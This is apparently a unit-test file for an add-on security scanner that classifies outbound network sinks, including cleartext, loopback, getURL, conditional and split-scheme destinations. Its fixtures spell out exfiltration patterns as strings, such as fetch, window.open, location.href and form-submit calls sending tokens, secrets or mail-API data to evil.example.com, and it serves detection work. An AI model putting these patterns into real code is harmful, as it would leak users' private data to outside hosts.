// Unit tests for the scheme (cleartext) and host fields scanNetworkSinks records
// on each sink - the data the cleartext-transmission and privacy-policy checks
// read - plus the covert-channel classification (the window-open / navigation sink
// types and carriesData) the disguised-window / disguised-navigation checks gate on.
// The remaining channel/destClass field combinations are covered in rules.test.js
// alongside the checks that consume them.

import { test } from "node:test";
import { URL_CLASS, OVERTNESS } from "../../src/lib/enum.js";
import assert from "node:assert/strict";

import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
import { srcText } from "../../src/parse/ast.js";

const one = (code) => scanNetworkSinks(code).hits[0];

// Non-TLS schemes (http/ws/ftp) are cleartext; their TLS variants are not. The
// host is parsed from the scheme://host authority.
test("scanNetworkSinks marks cleartext schemes and extracts the host", () => {
  const http = one('fetch("http://api.example.com/collect");');
  assert.equal(http.cleartext, true);
  assert.equal(http.host, "api.example.com");
  assert.equal(http.destClass, URL_CLASS.REMOTE);

  assert.equal(one('fetch("https://api.example.com/x");').cleartext, false);
  assert.equal(one('fetch("ftp://files.example.com/x");').cleartext, true);
  assert.equal(one('new WebSocket("ws://x.example.com/f");').cleartext, true);
  assert.equal(one('new WebSocket("wss://x.example.com/f");').cleartext, false);
});

// A dynamic URL still carries its scheme and host in the leading static prefix.
test("scanNetworkSinks reads scheme/host from a dynamic URL prefix", () => {
  const hit = one('fetch("http://api.example.com/?d=" + token);');
  assert.equal(hit.cleartext, true);
  assert.equal(hit.host, "api.example.com");
  assert.equal(hit.dataAppended, true);
});

// The host is read through a CSS url(...) wrapper (a covert style sink).
test("scanNetworkSinks reads host through a CSS url() wrapper", () => {
  const hit = one(
    'el.style.backgroundImage = "url(http://cdn.example.com/a.png)";'
  );
  assert.equal(hit.cleartext, true);
  assert.equal(hit.host, "cdn.example.com");
});

// A local path is neither remote nor cleartext and has no host.
test("a local path has no host and is not cleartext", () => {
  const hit = one('fetch("/api/local.json");');
  assert.equal(hit.cleartext, false);
  assert.equal(hit.host, null);
  assert.equal(hit.destClass, URL_CLASS.LOCAL);
});

// Loopback traffic never leaves the machine, so a literal loopback sink is local:
// not cleartext, no host (clears the cleartext-transmission + privacy-policy FPs).
test("a loopback destination is treated as local, not a cleartext remote send", () => {
  for (const url of [
    "http://127.0.0.1:11434/api/generate",
    "http://127.1/x", // 127.0.0.0/8 shorthand
    "http://localhost:8080/x",
    "http://sub.localhost/x",
    "http://[::1]:9/x",
    "http://0.0.0.0/x",
  ]) {
    const hit = one(`fetch(${JSON.stringify(url)});`);
    assert.equal(hit.destClass, URL_CLASS.LOCAL, url);
    assert.equal(hit.cleartext, false, url);
    assert.equal(hit.host, null, url);
  }
  const ws = one('new WebSocket("ws://127.0.0.1:1234/");');
  assert.equal(ws.destClass, URL_CLASS.LOCAL);
  assert.equal(ws.cleartext, false);
});

// The concat-prefix loopback form ("http://127.0.0.1:" + port) resolves the host
// from the static prefix and is likewise local.
test("a concat-prefix loopback URL is local (no cleartext, no dataAppended)", () => {
  const hit = one('fetch("http://127.0.0.1:" + port + "/x");');
  assert.equal(hit.destClass, URL_CLASS.LOCAL);
  assert.equal(hit.cleartext, false);
  assert.equal(hit.dataAppended, false);
});

// A real remote host is unaffected by the loopback exemption - including a
// hostname that merely starts with "127." (only all-numeric 127.x is loopback).
test("a real remote http sink still flags cleartext after the loopback fix", () => {
  const hit = one('fetch("http://api.example.com/collect");');
  assert.equal(hit.destClass, URL_CLASS.REMOTE);
  assert.equal(hit.cleartext, true);
  assert.equal(hit.host, "api.example.com");

  const hostlike = one('fetch("http://127.example.com/collect");');
  assert.equal(hostlike.destClass, URL_CLASS.REMOTE);
  assert.equal(hostlike.cleartext, true);
  assert.equal(hostlike.host, "127.example.com");
});

// fetch(getURL(<relative>)) / img.src = getURL(<relative>) targets a packaged
// moz-extension:// resource: a LOCAL destination (no host), never an outbound
// transmission or exfil channel. getURL resolves the argument against the extension
// base, so a fully-static relative argument (literal or uninterpolated template)
// stays local; alias-aware, mirroring the remote-code scanner.
test("a getURL(<relative>) destination is local, not an outbound sink", () => {
  for (const code of [
    'fetch(browser.runtime.getURL("data.json"));',
    "fetch(browser.runtime.getURL(`data.json`));",
    'const img = new Image(); img.src = browser.runtime.getURL("x.png");',
    'fetch(chrome.extension.getURL("data.json"));',
    'fetch(messenger.runtime.getURL("w.json"));',
    'const rt = browser.runtime; fetch(rt.getURL("data.json"));',
  ]) {
    const hit = one(code);
    assert.equal(hit.destClass, URL_CLASS.LOCAL, code);
    assert.equal(hit.host, null, code);
    assert.equal(hit.cleartext, false, code);
    assert.equal(hit.dataAppended, false, code);
  }
});

// The one-step variable indirection resolves like the inline call: an
// identifier bound once to getURL(<static relative>) is a local destination
// (`const url = getURL("a.json"); fetch(url)`). A reassigned binding must NOT
// resolve - the later value could be remote, so it stays conservatively
// dynamic - and a shadowing local must not leak the outer binding's URL.
test("a variable bound to getURL(<relative>) is local; reassignment is not", () => {
  for (const code of [
    'const url = browser.runtime.getURL("data.json"); fetch(url);',
    "const api = globalThis.browser ?? globalThis.chrome;" +
      ' const url = api.runtime.getURL("data.json"); fetch(url);',
  ]) {
    const hit = one(code);
    assert.equal(hit.destClass, URL_CLASS.LOCAL, code);
    assert.equal(hit.host, null, code);
  }
  const reassigned = one(
    'let url = browser.runtime.getURL("data.json");' +
      ' url = "https://evil.example.com/c"; fetch(url);'
  );
  assert.notEqual(reassigned.destClass, URL_CLASS.LOCAL);
  const shadowed = one(
    'const url = browser.runtime.getURL("data.json");' +
      " function f(url) { fetch(url); } f(remote);"
  );
  assert.notEqual(shadowed.destClass, URL_CLASS.LOCAL);
});

// A conditional destination can take either arm at runtime, so the sink is judged
// on ALL of them and the gravest one governs - an absolute URL in any arm is a
// remote sink, never masked by a local-looking sibling. The arms are read wherever
// they sit: standalone, nested for a third choice, inside a concatenation, wrapped
// in getURL or written plainly, inline or held in a variable.
test("a conditional destination is judged on every arm, gravest first", () => {
  for (const code of [
    'fetch(browser.runtime.getURL(c ? "a.json" : "https://evil.example.com/x"));',
    'const url = browser.runtime.getURL(c ? "a.json" : "https://evil.example.com/x"); fetch(url);',
    'fetch(browser.runtime.getURL(c ? "a.json" : d ? "b.json" : "https://evil.example.com/x"));',
    'const url = browser.runtime.getURL(c ? "a.json" : d ? "b.json" : "https://evil.example.com/x"); fetch(url);',
    'fetch(browser.runtime.getURL((c ? "a" : "https://evil.example.com/x") + ".json"));',
    'const url = browser.runtime.getURL((c ? "a" : "https://evil.example.com/x") + ".json"); fetch(url);',
    'fetch(c ? "a.json" : "https://evil.example.com/x");',
  ]) {
    const hit = one(code);
    assert.notEqual(hit.destClass, URL_CLASS.LOCAL, code);
    assert.equal(hit.destClass, URL_CLASS.REMOTE, code);
    assert.equal(hit.host, "evil.example.com", code);
  }
});

// Judging every arm must not cost the clean case: when they are all relative the
// destination is local, and each arm keeps its own loopback downgrade - a loopback
// arm is local on its own but never launders a remote sibling.
test("a conditional destination whose arms are all local stays local", () => {
  for (const code of [
    'fetch(browser.runtime.getURL(dark ? "d.css" : "l.css"));',
    'const url = browser.runtime.getURL(dark ? "d.css" : "l.css"); fetch(url);',
    'fetch(c ? "http://127.0.0.1/x" : "http://localhost/y");',
  ]) {
    assert.equal(one(code).destClass, URL_CLASS.LOCAL, code);
  }
  const mixed = one(
    'fetch(c ? "http://127.0.0.1/x" : "https://evil.example.com/y");'
  );
  assert.equal(mixed.destClass, URL_CLASS.REMOTE);
  assert.equal(mixed.host, "evil.example.com");
});

// Each conditional multiplies the values an expression can take, so a chain of
// them grows exponentially. Past the bound the destination is reported unresolved
// rather than half-enumerated - a truncated value set would let the arm that was
// dropped decide nothing, which is exactly the masking this resolution prevents.
test("a destination with more values than the bound stays unresolved", () => {
  const arms = ["ab", "cd", "ef", "gh", "ij", "kl"].map(
    ([x, y], i) => `(v${i} ? "${x}" : "${y}")`
  );
  // Five arms -> 32 combinations, all relative: within the bound, so resolved.
  assert.equal(
    one(`fetch(${arms.slice(0, 5).join(" + ")});`).destClass,
    URL_CLASS.LOCAL
  );
  // Six -> 64: over the bound, so unresolved rather than partially enumerated.
  assert.equal(one(`fetch(${arms.join(" + ")});`).destClass, URL_CLASS.DYNAMIC);
});

// A scheme can be spelled across several pieces of a concatenation, so the static
// run leading a dynamic URL is read whole rather than cut at its first piece - a
// destination assembled as "htt" + "ps://host" or "/" + "/host" is remote, not the
// relative-looking path its first piece resembles. This holds however the tail is
// built, including one with too many values to enumerate.
test("a scheme split across concatenated pieces is read whole", () => {
  const remote = (code, host) => {
    const hit = one(code);
    assert.equal(hit.destClass, URL_CLASS.REMOTE, code);
    assert.equal(hit.host, host, code);
  };
  remote(
    'fetch("htt" + "ps://evil.example.com/x" + token);',
    "evil.example.com"
  );
  remote('fetch("/" + "/evil.example.com/x" + token);', null);
  const arms = ["ab", "cd", "ef", "gh", "ij", "kl"].map(
    ([x, y], i) => `(v${i} ? "${x}" : "${y}")`
  );
  remote(`fetch("/" + "/evil.example.com/x" + ${arms.join(" + ")});`, null);
  // A leading run that really is relative still classifies local: reading the
  // whole run must not invent a scheme that is not there.
  assert.equal(
    one(`fetch("as" + "sets/i.png" + ${arms.join(" + ")});`).destClass,
    URL_CLASS.LOCAL
  );
});

// Among equally grave destinations the cleartext one governs, so a send that
// travels unencrypted on one of its paths is reported as cleartext and the host
// named is that path's.
test("a conditional destination reports the cleartext arm among remote arms", () => {
  for (const code of [
    'fetch(c ? "https://evil.example.com/x" : "http://evil.example.com/x");',
    'fetch(c ? "http://evil.example.com/x" : "https://evil.example.com/x");',
  ]) {
    const hit = one(code);
    assert.equal(hit.cleartext, true, code);
    assert.equal(hit.host, "evil.example.com", code);
  }
});

// getURL with no argument mints the extension's own base URL - a local resource,
// not an unresolved destination.
test("a zero-argument getURL destination is local", () => {
  assert.equal(
    one("fetch(browser.runtime.getURL());").destClass,
    URL_CLASS.LOCAL
  );
});

// getURL does NOT force a sink local: an ABSOLUTE argument escapes the origin
// (getURL("https://x") -> "https://x"), so fetch(getURL("https://evil")) must stay
// a REMOTE sink - a remote/exfil URL wrapped in getURL is not masked.
test("a getURL(<absolute>) destination stays a remote sink", () => {
  const abs = one(
    'fetch(browser.runtime.getURL("https://evil.example.com/c"));'
  );
  assert.equal(abs.destClass, URL_CLASS.REMOTE);
  assert.equal(abs.host, "evil.example.com");
  assert.equal(abs.cleartext, false);
  // The same holds through the one-step variable indirection: parking the
  // getURL result in a binding must not launder an absolute argument into a
  // local resource.
  const viaVar = one(
    'const url = browser.runtime.getURL("https://evil.example.com/c");' +
      " fetch(url);"
  );
  assert.equal(viaVar.destClass, URL_CLASS.REMOTE);
  assert.equal(viaVar.host, "evil.example.com");
  const protoRel = one(
    'const url = browser.runtime.getURL("//evil.example.com/c"); fetch(url);'
  );
  assert.equal(protoRel.destClass, URL_CLASS.REMOTE);
});

// Over-suppression guard: getURL resolution must not swallow a genuinely remote
// sink, nor a getURL on some other object (not the API method).
test("getURL resolution does not over-suppress remote sinks", () => {
  const remote = one('fetch("https://evil.example.com/?d=" + token);');
  assert.equal(remote.destClass, URL_CLASS.REMOTE);
  assert.equal(remote.dataAppended, true);
  // getURL on an unrelated object is not the API method -> classified normally
  // (a bare call value -> dynamic, not forced local).
  const other = one("fetch(myObj.getURL(x));");
  assert.equal(other.destClass, URL_CLASS.DYNAMIC);
});

// A dynamically built <form> that is submitted is an overt transmission to its
// action URL - the form.submit() exfiltration channel (createElement + action +
// submit), which bypasses fetch/XHR. (infocodex pattern.)
test("createElement('form') + action + submit() is an overt sink to the action", () => {
  const hit = one(
    'const f = document.createElement("form");' +
      'f.method = "POST";' +
      'f.action = "https://cloud.example.com/mail.php";' +
      "f.submit();"
  );
  assert.equal(hit.type, "form-submit");
  assert.equal(hit.channel, OVERTNESS.OVERT);
  assert.equal(hit.destClass, URL_CLASS.REMOTE);
  assert.equal(hit.host, "cloud.example.com");
});

// The action set via setAttribute, a dynamic (configurable) destination, and
// requestSubmit() are all covered; a dynamic action resolves to "dynamic" so
// data-exfiltration still escalates it.
test("form action via setAttribute / dynamic URL / requestSubmit are covered", () => {
  const attr = one(
    'const f = document.createElement("form");' +
      'f.setAttribute("action", "http://pbx.local/x");' +
      "f.submit();"
  );
  assert.equal(attr.type, "form-submit");
  assert.equal(attr.cleartext, true);
  assert.equal(attr.host, "pbx.local");

  const dyn = one(
    'const f = document.createElement("form");' +
      "f.action = message.url;" +
      "f.requestSubmit();"
  );
  assert.equal(dyn.type, "form-submit");
  assert.equal(dyn.destClass, URL_CLASS.DYNAMIC);
});

// A form with no action set, and a .submit() on an untracked element, are not
// flagged (conservative: only a tracked, action-bearing built form).
test("form-submit without a tracked form or an action is not flagged", () => {
  assert.equal(scanNetworkSinks("document.forms[0].submit();").hits.length, 0);
  assert.equal(scanNetworkSinks("widget.submit();").hits.length, 0);
  // Tracked form but no action -> local destination, not an outbound transmission.
  const noAction = one('const f = document.createElement("form"); f.submit();');
  assert.equal(noAction.type, "form-submit");
  assert.equal(noAction.destClass, URL_CLASS.LOCAL);
});

// XHR vs window.open: a `.open(method, url)` is disambiguated by a LITERAL HTTP
// method OR by a tracked `new XMLHttpRequest()` receiver. A dynamic method on an
// XHR receiver must still be read as an XHR (url = args[1]), not misrouted to
// window.open (which would treat the method as the URL and drop the destination).
test("XHR with a dynamic method keeps its destination", () => {
  const dyn = one(
    'const xhr = new XMLHttpRequest(); xhr.open(opts.method, "http://evil.example.com/c");'
  );
  assert.equal(dyn.type, "xhr");
  assert.equal(dyn.host, "evil.example.com");
  assert.equal(dyn.cleartext, true);

  // A variable NAMED like an xhr but bound to something else is not flipped: the
  // construct (new XMLHttpRequest), not the name, is what marks an XHR.
  const notXhr = one(
    'const xhr = makeThing(); xhr.open(m, "http://x.example.com/c");'
  );
  assert.equal(notXhr.type, "window-open");

  // A genuine window.open (untracked receiver, non-method first arg) is unchanged.
  const win = one('window.open("http://popup.example.com/p");');
  assert.equal(win.type, "window-open");
  assert.equal(win.host, "popup.example.com");
});

// The two covert-navigation sinks the disguised-* checks consume: window.open and a
// location.href assignment. carriesData is the flag that separates a STRONG exfil (a
// user-data API call inside the URL) from an ordinary navigation, so it is asserted
// both true (a messenger.messages.* call is present) and false (none is).
test("window.open carrying a data-API call is a covert, data-bearing sink", () => {
  const hit = one(
    'window.open("https://evil.example.com/?d=" + messenger.messages.list(id));'
  );
  assert.equal(hit.type, "window-open");
  assert.equal(hit.channel, OVERTNESS.COVERT);
  assert.equal(hit.destClass, URL_CLASS.REMOTE);
  assert.equal(hit.carriesData, true);

  // Same sink to the same host, but no data-API call in the URL -> not data-bearing.
  const plain = one('window.open("https://evil.example.com/p");');
  assert.equal(plain.type, "window-open");
  assert.equal(plain.carriesData, false);
});

// The data-API call that makes a sink data-bearing is recognised through the
// api-base index, so every spelling of the root reports the same evidence: the
// bare name, a captured/feature-detected alias, and a root named on the global
// object. A plain local that merely shares a root's name carries nothing.
test("a data-API call is recognised through every spelling of its root", () => {
  const body = (call) =>
    one(`fetch("https://evil.example.com/x", {body: ${call}});`);
  for (const call of [
    "messenger.messages.getFull(1)",
    "globalThis.messenger.messages.getFull(1)",
    "window.browser.messages.getFull(1)",
    "self.messenger.messages.getFull(1)",
  ]) {
    assert.equal(body(call).carriesData, true, call);
  }
  const aliased = one(
    "const api = globalThis.browser ?? globalThis.chrome;" +
      ' fetch("https://evil.example.com/x", {body: api.messages.getFull(1)});'
  );
  assert.equal(aliased.carriesData, true);
  // A local object that happens to have a matching property name is not the API.
  assert.equal(body("cfg.messages.getFull(1)").carriesData, false);
});

test("a location.href navigation carrying a data-API call is covert and data-bearing", () => {
  const hit = one(
    'location.href = "https://evil.example.com/?d=" + messenger.messages.list(id);'
  );
  assert.equal(hit.type, "navigation");
  assert.equal(hit.channel, OVERTNESS.COVERT);
  assert.equal(hit.destClass, URL_CLASS.REMOTE);
  assert.equal(hit.carriesData, true);

  // A runtime value appended with no data-API call is a navigation but not data-bearing.
  const plain = one('location.href = "https://evil.example.com/u/" + userId;');
  assert.equal(plain.type, "navigation");
  assert.equal(plain.carriesData, false);
});

// Each sink records the destination AS WRITTEN, so a report can say where the data
// goes without the reviewer opening the file. Nothing is resolved: an identifier or
// a concatenation is quoted exactly as the developer typed it, because what was
// typed is the evidence. Every channel reaches its destination through one place in
// the scanner, so all of them carry it.
test("a sink records the destination expression as written", () => {
  const target = (code) => one(code).target;
  assert.equal(
    target('fetch("https://api.example.com/collect");'),
    '"https://api.example.com/collect"'
  );
  assert.equal(target("fetch(endpoint);"), "endpoint");
  assert.equal(target('fetch(base + "/collect");'), 'base + "/collect"');
  assert.equal(
    target('navigator.sendBeacon("https://x.example/b", d);'),
    '"https://x.example/b"'
  );
  assert.equal(
    target('const x = new XMLHttpRequest(); x.open("POST", url);'),
    "url"
  );
  assert.equal(target("new WebSocket(`wss://${h}/s`);"), "`wss://${h}/s`");
  assert.equal(
    target('new EventSource("https://x.example/e");'),
    '"https://x.example/e"'
  );
  assert.equal(target("window.open(u);"), "u");
  assert.equal(
    target('img.src = "https://evil.example/?d=" + secret;'),
    '"https://evil.example/?d=" + secret'
  );
  // A form submits to the action set earlier, which is the destination even though
  // it was written on another line.
  assert.equal(
    target(
      'const f = document.createElement("form");\nf.action = "https://evil.example/c";\nf.submit();'
    ),
    '"https://evil.example/c"'
  );
});

// A destination spanning lines still has to fit one locus line, and a sink that
// names no destination at all has none to report.
test("a destination is collapsed to one line, or absent", () => {
  assert.equal(
    one(
      'fetch(\n  cond\n    ? "https://a.example/x"\n    : "https://b.example/y"\n);'
    ).target,
    'cond ? "https://a.example/x" : "https://b.example/y"'
  );
  assert.equal(one("fetch();").target, null);
  assert.equal(one("window.open();").target, null);
  assert.equal(
    one('const x = new XMLHttpRequest(); x.open("GET");').target,
    null
  );
});

// srcText reads a node's own source by its offsets, so a node carrying none - hand
// built, or recovered from a parse error - must report nothing. Slicing undefined
// bounds would hand back the ENTIRE file, which would then be quoted into a report
// as if it were one destination.
test("srcText yields nothing for a node with no offsets", () => {
  const code = "const secret = 1;\nfetch(secret);";
  assert.equal(srcText({ type: "Identifier", name: "x" }, code), null);
  assert.equal(srcText(null, code), null);
  assert.equal(srcText(undefined, code), null);
  assert.equal(srcText({ start: 0, end: 5 }, code), "const");
  // Whitespace only, and a missing source, are absent rather than empty.
  assert.equal(srcText({ start: 5, end: 6 }, code), null);
  assert.equal(srcText({ start: 0, end: 5 }, null), null);
});

// The destination is the add-on's own text landing in a report a human reads in a
// terminal, so it arrives as plain visible characters. An escape sequence would let
// a reviewed string repaint or erase the report around it, and a bidi override would
// let it reorder what is shown.
test("a destination cannot carry control or format characters into the report", () => {
  const esc = String.fromCharCode(27);
  const painted = one(
    `fetch("http://b.example/${esc}[1A${esc}[2K erased", { body: d });`
  ).target;
  assert.ok(!/[\p{Cc}\p{Cf}]/u.test(painted), JSON.stringify(painted));
  assert.match(painted, /b\.example/);
  const reordered = one(
    'fetch("http://c.example/\u202Egnp.exe", { body: d });'
  ).target;
  assert.ok(!/[\p{Cc}\p{Cf}]/u.test(reordered), JSON.stringify(reordered));
});
